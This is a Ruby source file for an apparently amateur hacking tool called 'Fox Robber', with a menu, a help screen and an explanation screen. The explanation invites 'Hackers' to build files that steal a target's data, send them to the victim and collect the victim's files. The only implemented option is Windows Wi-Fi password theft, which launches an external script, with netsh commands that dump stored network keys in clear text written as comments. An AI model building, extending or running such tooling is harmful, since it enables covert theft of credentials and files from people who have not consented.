$error = 'This command is not true'
module All
  class Explain
    def explain
      system('clear')
      puts "** Hi Hackers.
      Welcome to the Fox robber. The Fox robber can make some file to steal a lot of data and save it.\n**********************************************************************************************************\n** How to use it?\n(1). First, you have to make a Fox robber file, Enter number 1 to make a a Fox robber file; Then you have to see a lot of option to make your own Fox robber file.\n(2). Send the file for your target.\n(3). Run the file.\n(4). The END. you copied your target data and you can see your targets files in your PC.\n[0]. back"
    end
  end

  class Help
    def help
      system('clear')
      puts "** First enter 1 or fox-robber to make robber file.\n** Then you see a lot of option to make robber file.\n** It to fucking easy.\n[0]. back"
    end
  end
end
system('clear')
system('chafa images.png')
system("echo \t\"FOX ROBBER\" | lolcat -a -d 30")
while true
  system('clear')
  puts "\tFOX ROBBER\n"
  puts "Tools:\n[0]. Back\n[1]. Fox robber\n[2]. Help\n[3]. Explain"
  job = 'nil'
  print "(#{job})>"
  command = gets.chomp
  case command
  when '1', 'fox-robber'
    system('clear')
    puts "Enter target OS:\n[4]. Windows\n[5]. Mac\n[6]. Linux\n[7]. Android\n[8]. IOS\n[0]. Back"
    job = 'fox-robber'
    print "(#{job})>"
    command_fox_robber = gets.chomp
    while true
      if %w[0 back].include?(command_fox_robber)
        system('clear')
        break
      else
        case command_fox_robber
        when '4', 'windows'
          system('clear')
          puts "What do you want:\n[9]. Steal WIFI password\n[0]. Back"
          job = 'fox-robber [windows]'
          print "(#{job})>"
          command_windows = gets.chomp
          case command_windows
          when '9', 'steal wifi password'
            puts 'Loading...'
            system('/Windows/./Windows_Steal WIFI password.py')
              #'netsh wlan show profile'
              #'netsh wlan show profile WiFi-name key=clear'
            puts 'File made by Fox Robber 🦊'
            system('sleep 1')
            system("echo \"\t<Press enter>\" | lolcat -a")
            gets.chomp
            break
          when '0', 'back'
            break
          end
        end
      end
    end
  when '2', 'help'
    helper = All::Help.new
    helper.help
    while true
      job = 'help'
      print "(#{job})>"
      command_help = gets.chomp
      if %w[0 back].include?(command_help)
        system('clear')
        break
      else
        puts $error
        system('sleep 1')
        print "(#{job})>"
      end
    end
  when '3', 'explain'
    describe = All::Explain.new
    describe.explain
    while true
      job = 'explain'
      print "(#{job})>"
      command_explain = gets.chomp
      if %w[0 back].include?(command_explain)
        system('clear')
        break
      else
        puts $error
        system('sleep 1')
        print "(#{job})>"
      end
    end
  when '0', 'back'
    next
  else
    puts $error
    system('sleep 1')
    print "(#{job} [linux])>"
  end
end
